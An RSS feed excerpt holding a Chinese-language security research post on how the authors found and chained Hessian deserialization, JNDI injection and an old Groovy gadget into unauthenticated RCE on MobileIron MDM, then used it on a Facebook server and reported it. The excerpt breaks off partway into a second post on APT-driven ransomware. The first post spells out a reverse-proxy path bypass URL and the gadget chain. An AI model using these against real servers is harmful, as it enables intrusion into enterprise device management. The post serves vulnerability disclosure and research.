&lt;p&gt;MDM 作為一個中心化的端點控制系統，可以控制、並管理旗下所有員工個人裝置! 對日益壯大的企業來說，絕對是一個最佳的資產盤點產品，相對的，對駭客來說也是! 而為了管理來自世界各地的員工裝置連線，MDM 又勢必得曝露在外網。 一個可以「管理員工裝置」又「放置在外網」的設備，這對我們的紅隊演練來說無疑是最棒的滲透管道!&lt;/p&gt;

&lt;p&gt;另外，從這幾年的安全趨勢也不難發現 MDM 逐漸成為駭客、APT 組織的首選目標! 誘使受害者同意惡意的 MDM 成為你裝置的 C&amp;amp;C 伺服器，或是乾脆入侵企業放置在外網的 MDM 設備，在批次地派送行動裝置木馬感染所有企業員工手機、電腦，以達到進一步的攻擊! 這些都已成真，詳細的報告可參閱 Cisco Talos 團隊所發表的 &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Let’s Hide This App&lt;/a&gt; 以及 CheckPoint CPR 團隊所發表的 &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;從前面的幾個案例我們得知 MDM 對於企業安全來說，是一個很好的切入點，因此我們開始研究相關的攻擊面! 而市面上 MDM 廠商有非常多，各個大廠如 Microsoft、IBM 甚至 Apple 都有推出自己的 MDM 產品，我們要挑選哪個開始成為我們的研究對象呢?&lt;/p&gt;

&lt;p&gt;因此我們透過公開情報列舉了市面上常見的 MDM 產品，並配合各家特徵對全世界進行了一次掃描，發現最多企業使用的 MDM 為 VMware AirWatch 與 MobileIron 這兩套產品! 至於要挑哪一家研究呢? 我們選擇了後者，除了考量到大部分的客戶都是使用 MobileIron 外，另外一個吸引我的點則是 Facebook 也是他們的客戶! 從我們在 2016 年發表的 &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; 研究中，就已發現 Facebook 使用 MobileIron 作為他們的 MDM 解決方案!&lt;/p&gt;

&lt;p&gt;根據 MobileIron 官方網站描述，至少有 20000+ 的企業使用 MobileIron 當成他們的 MDM 解決方案，而根據我們實際對全世界的掃描，也至少有 15% 以上的財富世界 500 大企業使用 MobileIron 且&lt;strong&gt;曝露在外網&lt;/strong&gt;(實際上一定更多)，因此，尋找 MobileIron 的漏洞也就變成我們的首要目標!&lt;/p&gt;

&lt;h2 id=&quot;如何開始研究&quot;&gt;如何開始研究&lt;/h2&gt;

&lt;p&gt;從&lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;過往出現過的漏洞&lt;/a&gt;可以得知 MobileIron 並沒有受到太多安全人員研究，其中原因除了 MDM 這個攻擊向量尚未廣為人知外，另一個可能是因為關於 MobileIron 的相關韌體太難取得，研究一款設備最大的問題是如何從純粹的黑箱，到可以分析的灰箱、甚至白箱! 由於無法從官網下載韌體，我們花費了好幾天嘗試著各種關鍵字在網路上尋找可利用的公開資訊，最後才在 Goolge Search 索引到的其中一個公開網站根目錄上發現疑似是開發商測試用的 RPM 包。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下載回的韌體為 2018 年初的版本，離現在也有很長一段時間，也許核心程式碼也大改過，不過總比什麼都沒有好，因此我們就從這份檔案開始研究起。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;備註: 經通知 MobileIron 官方後，此開發商網站已關閉。&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何尋找漏洞&quot;&gt;如何尋找漏洞&lt;/h2&gt;

&lt;p&gt;整個 MobileIron 使用 Java 作為主要開發語言，對外開放的連接埠為 443, 8443, 9997，各個連接埠對應功能如下:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;443 為使用者裝置註冊介面&lt;/li&gt;
  &lt;li&gt;8443 為設備管理介面&lt;/li&gt;
  &lt;li&gt;9997 為一個 MobileIron 私有的裝置同步協定 (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;三個連接埠皆透過 TLS 保護連線的安全性及完整性，網頁部分則是透過 Apache 的 Reverse Proxy 架構將連線導至後方，由 Tomcat 部署的網頁應用處理，網頁應用則由 Spring MVC 開發。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由於使用的技術架構相對新，傳統類型的漏洞如 SQL Injection 也較難從單一的點來發現，因此理解程式邏輯並配合架構層面的攻擊就變成我們這次尋找漏洞的主要目標!&lt;/p&gt;

&lt;p&gt;這次的漏洞也很簡單，主要是 Web Service 使用了 Hessian 格式處理資料進而產生了反序列化的弱點! 雖然漏洞一句話就可以解釋完了，但懂的人才知道反序列化並不代表你可以做任何事，接下來的利用才是精彩的地方!&lt;/p&gt;

&lt;p&gt;現在已知 MobileIron 在處理 Web Service 的地方存在 Hessian 反序列化漏洞! 但漏洞存在，並不代表我們碰得到漏洞，可以觸發 Hessian 反序列化的路徑分別在:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;一般使用者介面 - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;管理介面 - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron:8443/mifs/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;管理介面基本上沒有任何阻擋，可以輕鬆的碰到 Web Service，而一般使用者介面的 Web Service 則無法存取，這對我們來說是一個致命性的打擊，由於大部分企業的網路架構並不會將管理介面的連接埠開放在外部網路，因此只能攻擊管理介面對於的利用程度並不大，因此我們必須尋找其他的方式去觸發這個漏洞!&lt;/p&gt;

&lt;p&gt;仔細觀察 MobileIron 的阻擋方式，發現它是透過在 Apache 上使用 Rewrite Rules 去阻擋對一般使用者介面 Web Service 的存取:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;嗯，很棒! 使用 Reverse Proxy 架構而且是在前面那層做阻擋，你是否想到什麼呢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;沒錯! 就是我們在 &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;2015 年&lt;/a&gt;發現，並且在 &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt; 上所發表的針對 Reverse Proxy 架構的新攻擊面 &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! 這個優秀的技巧最近也被很好的利用在 &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;CVE-2020-5902&lt;/a&gt;，F5 BIG-IP TMUI 的遠端程式碼執行上!&lt;/p&gt;

&lt;p&gt;透過 Apache 與 Tomcat 對路徑理解的不一致，我們可以透過以下方式繞過 Rewrite Rule 再一次攻擊 Web Service!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;碰! 因此現在不管是 8443 的管理介面還是 443 的一般使用者介面，我們都可以碰到有 Hessian 反序列化存在的 Web Service 了!&lt;/p&gt;

&lt;h2 id=&quot;如何利用漏洞&quot;&gt;如何利用漏洞&lt;/h2&gt;

&lt;p&gt;現在讓我們回到 Hessian 反序列化的利用上! 針對 Hessian 反序列化，&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; 已經在他的 &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; 中做了一個很詳細的研究報告! 從他所開源的 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; 原始碼中，我們也學習到 Hessian 在反序列化過程中除了透過 HashMap 觸發 &lt;code class=&quot;highlighter-rouge&quot;&gt;equals()&lt;/code&gt; 以及 &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; 等觸發點外，也可透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;XString&lt;/code&gt; 串出 &lt;code class=&quot;highlighter-rouge&quot;&gt;toString()&lt;/code&gt;，而目前關於 Hessian 反序列化已存在的利用鏈有四條:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而根據我們的目標環境，可以觸發的只有 Spring AOP 這條利用鏈!&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI 注入&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI 注入&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;√&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI 注入&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;無論如何，我們現在有了 JNDI 注入後，接下來只要透過 &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; 與 &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; 在 Black Hat USA 2016 上所發表的 &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt; 就可以取得遠端程式碼執行了… 甘安內?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;自從 &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; 與 &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; 在 Black Hat 發表了這個新的攻擊向量後，不知道幫助了多少大大小小的駭客，甚至會有人認為「遇到反序列化就用 JNDI 送就對了!」，但自從 2018 年十月，Java 終於把關於 JNDI 注入的最後一塊拼圖給修復，這個修復被記載在 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3149&quot;&gt;CVE-2018-3149&lt;/a&gt; 中，自此之後，所有 Java 高於 8u181, 7u191, 6u201 的版本皆無法透過 JNDI/LDAP 的方式執行程式碼，因此若要在最新版本的 MobileIron 上實現攻擊，我們勢必得面對這個問題!&lt;/p&gt;

&lt;p&gt;關於 CVE-2018-3149，是透過將 &lt;code class=&quot;highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; 的預設值改為 &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; 的方式以達到禁止攻擊者下載遠端 Bytecode 取得執行程式碼。&lt;/p&gt;

&lt;p&gt;但幸運的是，我們依然可以透過 JNDI 的 Naming Reference 到本機既有的 Class Factory 上! 透過類似 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt; 的概念，尋找本機 ClassPath 中可利用的類別去做更進一步的利用，詳細的手法可參考由 &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; 在 2019 年年初所發表的 &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt;，裡面詳細敘述了如何透過 Tomcat 的 &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; 去載入 &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; 達成任意程式碼執行!&lt;/p&gt;

&lt;p&gt;這條路看似通暢，但實際上卻差那麼一點，由於 &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; 在 Tomcat 8 後才被引入，因此上面的繞過方式只能在 Tomcat 版本大於 8 後的某個版本才能成功，而我們的目標則是 Tomcat 7.x，因此得為 &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; 尋找一個新的利用鏈! 而經過搜尋，發現在 &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; 的&lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;文章&lt;/a&gt;中所提到:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;除了 javax.el.ELProcessor，当然也还有很多其他的类符合条件可以作为 beanClass 注入到 BeanFactory 中实现利用。举个例子，如果目标机器 classpath 中有 groovy 的库，则可以结合之前 Orange 师傅发过的 &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins 的漏洞实现利用&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;目標的 ClassPath 上剛好有 Groovy 存在! 於是我們又讓 Meta Programming 偉大了一次 :D&lt;/p&gt;

&lt;p&gt;然而事實上，目標伺服器上 Groovy 版本為 1.5.6，是一個距今十年前老舊到不支援 Meta Programming 的版本，所以我們最後還是基於 Groovy 的程式碼，重新尋找了一個在 &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; 上的利用鏈! 詳細的利用鏈可參考我送給 &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; 的這個 &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt;!&lt;/p&gt;

&lt;h2 id=&quot;攻擊-facebook&quot;&gt;攻擊 Facebook&lt;/h2&gt;

&lt;p&gt;現在我們已經有了一個基於 &lt;code class=&quot;highlighter-rouge&quot;&gt;JNDI&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; 的完美遠端程式碼執行漏洞，接下來就開始攻擊 Facebook 吧! 從前文提到，我們在 2016 年時就已知 Facebook 使用 MobileIron 當作他們的 MDM 解決方案，雖然現在再檢查一次發現首頁直接變成 403 Forbidden 了，不過幸運的是 Web Service 層並無阻擋!&lt;br /&gt;
s&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;萬事俱備，只欠東風! 正當要攻擊 Facebook 的前幾天，我們突然想到，從上次&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;進入 Facebook 伺服器&lt;/a&gt;的經驗，由於安全上的考量，Facebook 似乎會禁止所有對外部非法的連線，這點對我們 JNDI 注入攻擊有著至關重要的影響! 首先，JNDI 注入的核心就是透過受害者連線至攻擊者控制的惡意伺服器，並接收回傳的惡意 Naming Reference 後所導致的一系列利用，但現在連最開始的連線到攻擊者的惡意伺服器都無法，更別談後續的利用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;自此，我們關於 JNDI 注入的路已全被封殺，只能回到 Hessian 反序列化重新思考! 而現有的利用鏈皆無法達到遠端程式碼執行，所以我們勢必得拋棄 JNDI 注入，尋找一個新的利用鏈!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;為了尋找新的利用鏈，必須先深入理解已存在利用鏈的原理及成因，在重讀 &lt;a href=&quot;https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; 的論文後，我對其中一句話感到了好奇:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovy’s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;哦，為什麼作者要特地補上這句話呢? 我開始有個猜想:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;作者評估過把 Groovy 當成利用鏈的可行性，雖然被限制住了，但一定覺得有機會才會寫進論文中!&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從這個猜想出發，雖然 Groovy 的利用鏈被 &lt;code class=&quot;highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; 限制住了，但剛好我們目標版本的 Groovy 很舊，說不定尚未把這個限制加入程式庫!&lt;/p&gt;

&lt;p&gt;我們比較了一下 Groovy-1.5.6 與最新版本位於 &lt;code class=&quot;highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; 中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;readSolve()&lt;/code&gt; 實現:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到的確在舊版是沒有 &lt;code class=&quot;highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; 限制的，而後來經過考古後也發現，這個限制其實 Groovy 自己為了因應 2015 年所出現 Java 反序列化漏洞的減緩措施，因此也被分配了 &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; 這個漏洞編號! 由於 Groovy 只是一個只在內部使用、不會對外的小配角，因此在沒有特別需求下開發者也不會特地去更新它，因此成為了我們攻擊鏈的一環! 這也再一次驗證了「任何看似舉無輕重的小元件，都有可能成為你被攻擊的主因」!&lt;/p&gt;

&lt;p&gt;最後，當然! 我們成功的取得在 Facebook 伺服器上的 Shell，以下是影片:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;漏洞通報與修復&quot;&gt;漏洞通報與修復&lt;/h2&gt;

&lt;p&gt;我們約在三月時完成整個漏洞研究，並在 4/3 日將研究成果寫成報告，透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;security@mobileiron.com&lt;/code&gt; 回報給 MobileIron! 官方收到後著手開始修復，在 6/15 釋出修補程式並記錄了三個 CVE 編號，詳細的修復方式請參閱 &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;MobileIron 官方網站&lt;/a&gt;!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;當官方釋出修補程式後，我們也開始監控世界上所有有使用 MobileIron 企業的修復狀況，這裡只單純檢查靜態檔案的 &lt;code class=&quot;highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; Header，結果僅供參考不完全代表實際情況(Unknown 代表未開 443/8443 無法利用):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;與此同時，我們也持續監控著 Facebook，並在 15 天確認都未修補後於 7/2 日成功進入 Facebook 伺服器後回報 Facebook Bug Bounty Program!&lt;/p&gt;

&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;p&gt;到此，我們已經成功示範了如何尋找一個 MDM 伺服器的漏洞! 從繞過 Java 語言層級的保護、網路限制，到寫出攻擊程式並成功的利用在 Bug Bounty Program 上! 因為文長，還有許多來不及分享的故事，這裡僅條列一下供有興趣繼續研究的人參考!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如何從 MDM 伺服器，控制回員工的手機裝置&lt;/li&gt;
  &lt;li&gt;如何分析 MobileIron 的私有 MI Protocol&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 本質上其實是一個很有趣的認證繞過漏洞&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;希望這篇文章能夠喚起大眾對於 MDM 攻擊面的注意，以及企業安全的重要性! 感謝收看 :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>敵人不是勒贖軟體，而是組織型駭客</title>
                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;駭客攻擊事件一直存在於真實世界，只是鮮少被完整公開揭露。今年國內一些重大關鍵基礎設施 (Critical Information Infrastructure Protection，CIIP) 以及國內的跨國企業紛紛發生嚴重的資安事件，我們想簡單的跟大家談談這些事件背後企業真正需要思考及重視的核心問題。&lt;/p&gt;

&lt;h2 id=&quot;企業面對的是組織型駭客而不只是勒贖軟體&quot;&gt;企業面對的是組織型駭客而不只是勒贖軟體&lt;/h2&gt;

&lt;p&gt;不知道是因為勒贖軟體比較吸睛還是什麼緣故，媒體比較喜歡用勒贖軟體作為標題呈現近年企業面臨的重大威脅。實際上，勒贖軟體只是攻擊過程的工具、加密只是勒贖的手段之一，甚至包含竊取機敏資料。因為這些事件我們沒有參與調查或相關的活動，我們僅就已公開揭露的資料來一窺面對這樣的威脅，企業的具體做法有哪些？&lt;/p&gt;

&lt;p&gt;根據法務部調查局在 iThome 2020 資安大會的&lt;a href=&quot;https://www.ithome.com.tw/news/139331&quot;&gt;分享&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;在這起攻擊事件中，駭客首先從 Web 伺服器、員工電腦等途徑，入侵公司系統長期潛伏及探測，而後竊取帳號權限，進入 AD 伺服器，利用凌晨時段竄改群組派送原則（GPO），同時預埋 lc.tmp 惡意程式到內部伺服器中，等到員工上班打開電腦後，電腦立即套用遭竄改的 GPO，依據指令就會自動將勒索軟體載到記憶體中來執行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;企業在被勒贖軟體加密後，往往第一時間容易直覺想到防毒軟體或端點防護設備為何沒有生效？現實是，如果企業面對的是針對式的攻擊（Advanced Persistent Threat，APT），攻擊者勢必會研究可以繞過企業的防護或監控的方式。所以企業要思考的應該是一個防禦戰線或更為全面的防護策略，而非仰賴單一的資安設備或服務。&lt;/p&gt;

&lt;p&gt;從上述的敘述，我們可以發現幾個問題：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Web 伺服器具有可利用的漏洞&lt;/strong&gt;，而這個漏洞可能導致主機被取得權限進行後續的橫向移動。造成這個問題的原因可能包含：
    &lt;ul&gt;
      &lt;li&gt;系統從未進行高強度的滲透測試及定期執行弱點掃描&lt;/li&gt;
      &lt;li&gt;屬於老舊無法修補的系統（使用老舊的框架、程式語言）或是廠商已經不再維護&lt;/li&gt;
      &lt;li&gt;一次性的活動網站或測試網站，活動或測試結束後未依照程序下線，成為企業防禦破口&lt;/li&gt;
      &lt;li&gt;不在企業盤點的防護範圍內（如前端未設置 WAF）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;從員工電腦或是 Web 伺服器可以逐步跳到 AD 伺服器&lt;/strong&gt;，可能存在的問題則包含：
    &lt;ul&gt;
      &lt;li&gt;網路間的區隔不嚴謹，例如未依照資料或系統的重要性進行區隔&lt;/li&gt;
      &lt;li&gt;同網段伺服器間的通訊方式管控不當，沒有開啟或管制重要伺服器的通訊埠或限制來源 IP 位址&lt;/li&gt;
      &lt;li&gt;系統存在可利用取得權限的弱點&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
